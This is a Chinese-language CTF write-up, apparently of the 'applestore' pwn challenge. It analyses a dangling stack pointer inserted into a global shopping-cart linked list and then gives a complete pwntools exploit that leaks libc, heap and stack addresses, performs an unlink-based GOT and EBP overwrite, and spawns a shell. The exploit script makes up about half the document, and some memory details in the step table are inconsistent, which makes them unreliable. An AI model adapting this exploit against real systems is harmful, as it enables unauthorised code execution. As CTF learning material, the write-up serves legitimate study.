## # 漏洞成因

### 关键结构体
程序使用双向链表管理购物车，关键结构体定义如下（从反编译代码推断）：
```c
struct cart_item {
    char *name;        // 0x0: 商品名称指针（堆分配）
    int price;         // 0x4: 商品价格
    struct cart_item *next;  // 0x8: 指向下一个节点
    struct cart_item *prev;  // 0xC: 指向前一个节点
};
```
全局变量`myCart`（地址`0x804b070`）指向链表头。

### 漏洞分析
漏洞位于`checkout()`函数中，具体成因如下：
- **漏洞位置**：`checkout()`函数中的条件分支（当总价等于7174时）。
- **漏洞代码**：
  ```c
  if ( v1 == 7174 ) {
    puts("*: iPhone 8 - $1");
    asprintf(v2, "%s", "iPhone 8");  // 将堆地址写入栈变量v2[0]
    v2[1] = (char *)1;
    insert((int)v2);  // 将栈地址v2插入全局链表
    v1 = 7175;
  }
  ```
- **漏洞类型**：Use-After-Free (UAF)。
  - `v2`是栈上的局部数组（`char *v2[5]`），在`checkout()`函数返回后，其栈帧被释放。
  - 但`insert((int)v2)`将栈地址`v2`保存到全局链表`myCart`中，导致链表持有已释放栈内存的指针。
  - 后续操作（如`cart()`、`delete()`）遍历链表时，会访问无效栈内存，造成未定义行为。
- **动态调试验证**：调试记录显示，堆chunk `0x8be77e0`的`fd_nextsize`字段指向栈地址`0xffc176e8`，证实UAF漏洞被触发。

### 漏洞利用条件
- 攻击者可通过添加商品控制购物车总价，触发`checkout()`中的漏洞分支。
- UAF允许读取和写入已释放栈内存，结合堆布局操纵，可实现任意地址读写。

## # 漏洞利用过程

漏洞利用过程分为7个步骤，基于exp脚本和调试记录分析。下表总结了关键内存变化（聚焦栈和堆）：

| 步骤 | 操作描述 | 栈内存变化 | 堆内存变化 | 关键地址变化 |
|------|----------|-------------|-------------|---------------|
| **1** | `add(4,10); add(1,16); init()` | 栈帧正常，局部变量未污染。 | 堆分配多个chunk（大小0x19/0x11），构建购物车链表。 | `myCart`指向堆地址`0x8be7410`。 |
| **2** | 泄露libc地址：通过UAF读取GOT条目。 | 栈地址`0xffc176e8`内容被读取，包含libc地址（如`printf+38`）。 | 堆chunk `0x8be77e0`的`fd_nextsize`指向栈地址`0xffc176e8`。 | 计算libc基址：`libc_base = leak - libc.symbols['read']`。 |
| **3** | 泄露堆地址：通过UAF读取全局变量。 | 栈内容未变，继续用于泄露。 | 堆布局不变，FASTBIN链完整。 | 获取堆基址`heap_addr`，用于推算栈位置。 |
| **4** | 泄露栈地址：迭代读取栈内存。 | 多轮泄露后，定位栈返回地址`0xffc1770c`（指向`handler+61`）。 | 堆chunk被遍历，无结构性变化。 | 计算栈基址`stack_addr`，用于后续任意写。 |
| **5** | 任意地址写：通过`delete()`触发unlink。 | EBP被修改：`0xffc17708` → `0x804b05e`（指向GOT）。 | FASTBIN链被操纵，支持unlink攻击；chunk指针被重写。 | GOT污染：`0x804b066` → `0xffc176fc`（栈地址）。 |
| **6** | 发送ROP payload：执行`system("/bin/sh")`。 | 栈内容被覆盖，返回地址劫持；新栈帧为`/bin/dash`建立。 | 原始堆内存被释放，新堆为shell分配。 | 控制流转移：EIP指向libc的`system`函数。 |
| **7** | 交互模式：获取shell。 | 栈完全替换为`/bin/dash`环境（新地址`0x7ffe49fa0d38`）。 | 堆替换为shell内部数据结构。 | 程序内存映射更新，原始程序不可访问。 |

### 内存变化关键点
- **初始状态**：栈、堆、GOT均正常，无内存损坏。
- **信息泄露阶段**（步骤2-4）：通过UAF读取栈中的libc、程序地址和返回地址，绕过ASLR。
- **任意写阶段**（步骤5）：利用堆unlink操作修改栈EBP和GOT条目，实现内存交叉引用（栈→GOT、GOT→栈），为控制流劫持铺路。
- **控制流劫持**（步骤6-7）：通过覆盖返回地址执行ROP链，启动`/bin/dash`，完全替换程序内存。

### 防护绕过分析
- **栈Canary**：通过控制EBP和栈布局间接绕过，未直接触发canary检查。
- **NX保护**：使用ROP技术，避免执行shellcode。
- **ASLR**：通过信息泄露动态计算地址。

## # Exploit

以下为漏洞利用脚本（exp），基于提供的代码添加详细注释，解释关键步骤：

```python
from pwn import *

# 设置调试环境和上下文
context.log_level = 'debug'  # 启用调试输出，便于跟踪执行过程
context.terminal = ['tmux', 'splitw', '-h']  # 在tmux中分屏运行
p = process('./data/sample11')  # 启动目标程序
elf = ELF('./data/sample11')   # 加载ELF文件，用于获取符号和GOT地址
libc = elf.libc  # 自动关联libc，用于计算基址

def add(index, count):
    """添加商品到购物车：index为设备编号，count为添加数量"""
    for i in range(count):
        p.recvuntil(b'>')  # 等待菜单提示
        p.sendline(b'2')   # 选择添加功能
        p.recvuntil(b'Device Number> ')
        p.sendline(str(index).encode())  # 发送设备编号

def init():
    """初始化购物车，触发checkout()漏洞条件"""
    p.recvuntil(b'>')
    p.sendline(b'5')  # 选择结账功能
    p.recvuntil(b'Let me check your cart. ok? (y/n) > ')
    p.sendline(b'y')  # 确认结账，触发总价检查

def leak(payload):
    """利用UAF泄露内存：通过cart()功能读取链表中的悬垂指针"""
    p.sendline(b'4')  # 选择查看购物车
    p.recvuntil(b'Let me check your cart. ok? (y/n) > ')
    p.sendline(payload)  # 发送payload操纵链表遍历
    p.recvuntil(b'27: ')  # 定位泄露数据位置（第27项）
    return u32(p.recv(4))  # 读取4字节数据并转换为整数

def delete(payload):
    """删除购物车项：用于触发unlink操作，实现任意地址写"""
    p.recvuntil(b'>')
    p.sendline(b'3')  # 选择删除功能
    p.recvuntil(b'Item Number> ')
    p.sendline(payload)  # 发送payload操纵删除逻辑

def get_stack_addr(addr):
    """迭代泄露栈地址：通过多次UAF读取定位返回地址"""
    for i in range(26):
        # 构造payload：模拟cart_item结构，操纵链表指针
        payload = b'y\x00' + p32(addr + 8) + p32(0) + p32(0) + p32(0)
        addr = leak(payload)  # 每次泄露后更新地址
    return addr

# 步骤1：初始化堆布局并触发UAF漏洞
add(4, 10)  # 添加10个设备4，控制总价
add(1, 16)  # 添加16个设备1，进一步操纵堆
init()      # 触发checkout()，将栈地址插入全局链表

# 步骤2：泄露libc基址并计算system和/bin/sh地址
payload = b'y\x00' + p32(elf.got['read']) + p32(0) + p32(0) + p32(0)  # 指向GOT的read条目
data = leak(payload)  # 泄露read@got值
libc_base = data - libc.symbols['read']  # 计算libc基址
libc.address = libc_base  # 设置libc基址，便于符号解析
system_addr = libc.symbols['system']  # 获取system函数地址
bin_sh_addr = next(libc.search(b'/bin/sh'))  # 查找/bin/sh字符串地址

# 步骤3：泄露堆基址，用于推算栈位置
payload = b'y\x00' + p32(0x0804B070) + p32(0) + p32(0) + p32(0)  # 指向全局变量myCart
heap_addr = leak(payload)  # 泄露堆地址

# 步骤4：泄露栈返回地址
stack_addr = get_stack_addr(heap_addr)  # 通过堆地址迭代计算栈地址

# 步骤5：任意地址写，通过delete触发unlink修改内存
# 构造payload：覆盖链表指针，实现栈EBP和GOT的修改
payload = b'27' + p32(0) + p32(0) + p32(stack_addr + 0x20 - 0xc) + p32(elf.got['asprintf'] + 0x22)
delete(payload)  # 触发unlink，EBP被改为GOT地址，GOT被改为栈地址

# 步骤6：发送ROP payload，执行system("/bin/sh")
payload = b'sh\x00\x00' + p32(system_addr)  # 字符串"sh" + system地址
p.sendline(payload)  # 发送payload，触发控制流劫持

# 步骤7：进入交互模式，获取shell
p.interactive()  # 用户可执行任意shell命令
```

### 注释说明
- **关键函数**：`add`、`init`、`leak`、`delete` 封装了程序功能，用于操纵购物车链表。
- **信息泄露**：通过`leak`函数利用UAF读取内存，绕过ASLR。
- **任意地址写**：`delete` payload精心构造以触发堆unlink，修改栈和GOT。
- **ROP链**：最终payload直接执行`system("sh")`，利用libc函数获取shell。
- **防护绕过**：整个利用过程无需shellcode，依赖ROP和地址泄露，适应NX和ASLR环境。
